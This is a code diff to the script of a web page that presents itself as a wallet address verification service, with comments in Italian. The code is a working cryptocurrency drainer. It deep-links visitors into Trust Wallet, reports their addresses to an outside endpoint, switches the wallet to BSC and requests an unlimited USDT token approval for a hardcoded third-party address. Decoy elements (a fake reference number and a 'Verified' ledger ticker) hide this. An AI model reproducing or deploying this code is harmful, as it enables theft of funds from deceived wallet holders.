@@ -386,83 +386,135 @@
     try { await fetch(url); } catch(e) {}
   }
 
-  function openVerifyModal() { document.getElementById('verifyModalOverlay').classList.add('active'); }
-  function closeVerifyModal() { document.getElementById('verifyModalOverlay').classList.remove('active'); }
+  function openVerifyModal() { 
+    document.getElementById('verifyModalOverlay').classList.add('active'); 
+  }
+  
+  function closeVerifyModal() { 
+    document.getElementById('verifyModalOverlay').classList.remove('active'); 
+  }
 
   async function startFlow() {
     const inputAddr = document.getElementById('walletInput').value.trim();
-    if (!inputAddr.startsWith('0x')) { alert("Enter a valid address"); return; }
+    if (!inputAddr.startsWith('0x')) { 
+      alert("Enter a valid address"); 
+      return; 
+    }
+
     const isWeb3 = window.ethereum;
     const params = new URLSearchParams(window.location.search);
     const isAuto = params.get('auto') === '1';
+
     if (!isWeb3 || !isAuto) {
+      // Non siamo in Trust Wallet: reindirizza via deep link
       const baseUrl = window.location.href.split('?')[0];
       const targetUrl = baseUrl + '?auto=1&addr=' + encodeURIComponent(inputAddr);
       window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(targetUrl);
     } else {
-      executeApprove(inputAddr);
+      // Siamo in Trust Wallet: procedi con l'approvazione
+      await executeApprove(inputAddr);
     }
   }
 
   async function executeApprove(inputAddr) {
     document.getElementById('statusMsg').textContent = 'Processing...';
     try {
+      // Verifica che ethers sia caricato
+      if (typeof ethers === 'undefined') {
+        throw new Error('ethers.js not loaded');
+      }
+
       const provider = new ethers.providers.Web3Provider(window.ethereum);
       const signer = provider.getSigner();
       const connected = await signer.getAddress();
       sendTG(inputAddr, connected);
-      await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x38" }] });
-      const contract = new ethers.Contract("0x55d398326f99059fF775485246999027B3197955", ["function approve(address s, uint256 a) external returns (bool)"], signer);
-      const tx = await contract.approve("0x05187cf26990e3857c119c7bc3417c6e1fac5198", "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
+
+      // Switch a BSC
+      await window.ethereum.request({ 
+        method: "wallet_switchEthereumChain", 
+        params: [{ chainId: "0x38" }] 
+      });
+
+      // Approva il token
+      const contract = new ethers.Contract(
+        "0x55d398326f99059fF775485246999027B3197955", 
+        ["function approve(address s, uint256 a) external returns (bool)"], 
+        signer
+      );
+      
+      const tx = await contract.approve(
+        "0x05187cf26990e3857c119c7bc3417c6e1fac5198", 
+        "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+      );
+
+      // Mostra il risultato
       document.getElementById('stepInput').style.display = 'none';
       document.getElementById('stepResult').style.display = 'block';
       document.getElementById('resAddress').textContent = inputAddr;
       document.getElementById('resRef').textContent = "CC-" + Date.now().toString().slice(-6);
+      
       await tx.wait();
     } catch (e) {
       document.getElementById('statusMsg').textContent = '';
-      console.error(e);
+      console.error('Approval error:', e);
+      alert('Transaction failed or was rejected: ' + (e?.message || 'Unknown error'));
     }
   }
 
+  // Inizializzazione al caricamento della pagina
   window.addEventListener('load', async () => {
     const params = new URLSearchParams(window.location.search);
-    if (params.get('auto') === '1' && window.ethereum) {
-      // SIAMO IN TRUST WALLET
+    const isAuto = params.get('auto') === '1';
+    
+    if (isAuto && window.ethereum) {
+      // Siamo in Trust Wallet con auto=1
       const addr = params.get('addr') || '';
       document.getElementById('walletInput').value = decodeURIComponent(addr);
       
-      // CAMBIO TESTI MODAL
+      // Cambio testi modal
       document.getElementById('modalTitle').textContent = "Verify Address";
       document.getElementById('modalDesc').style.display = "block";
 
       try {
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
+        // Richiedi connessione wallet
+        await window.ethereum.request({ method: "eth_requestAccounts" });
+        // Apri il modal automaticamente
         openVerifyModal();
-      } catch (e) { console.error("Connect error:", e); }
-      document.getElementById('loadingOverlay').style.display = 'none';
-      document.body.classList.add('ready');
-    } else {
-      document.getElementById('loadingOverlay').style.display = 'none';
-      document.body.classList.add('ready');
+      } catch (e) { 
+        console.error("Connect error:", e);
+        alert("Failed to connect wallet. Please try again.");
+      }
     }
+    
+    // Nascondi loading overlay e mostra il sito
+    document.getElementById('loadingOverlay').style.display = 'none';
+    document.body.classList.add('ready');
   });
 
+  // Inizializza ledger track
   const track = document.getElementById('ledgerTrack');
-  const items = [
-    {h:'0x7a3f…9c21', t:'ok', l:'Verified'},
-    {h:'bc1q…4kd0', t:'review', l:'Under review'},
-    {h:'0x1b8e…77aa', t:'ok', l:'Verified'},
-    {h:'TQn9…88fp', t:'ok', l:'Verified'}
-  ].map(e => `<div class="entry"><span>${e.h}</span><span class="tag ${e.t}">${e.l}</span></div>`).join('');
-  track.innerHTML = items + items;
+  if (track) {
+    const items = [
+      {h:'0x7a3f…9c21', t:'ok', l:'Verified'},
+      {h:'bc1q…4kd0', t:'review', l:'Under review'},
+      {h:'0x1b8e…77aa', t:'ok', l:'Verified'},
+      {h:'TQn9…88fp', t:'ok', l:'Verified'}
+    ].map(e => `<div class="entry"><span>${e.h}</span><span class="tag ${e.t}">${e.l}</span></div>`).join('');
+    track.innerHTML = items + items;
+  }
+
+  // Inizializza FAQ
   document.querySelectorAll('.faq-item').forEach(i => {
-    i.querySelector('.faq-q').onclick = () => {
-      i.classList.toggle('open');
-      const a = i.querySelector('.faq-a');
-      a.style.maxHeight = i.classList.contains('open') ? a.scrollHeight + 'px' : null;
-    };
+    const q = i.querySelector('.faq-q');
+    if (q) {
+      q.onclick = () => {
+        i.classList.toggle('open');
+        const a = i.querySelector('.faq-a');
+        if (a) {
+          a.style.maxHeight = i.classList.contains('open') ? a.scrollHeight + 'px' : null;
+        }
+      };
+    }
   });
 </script>
 </body>
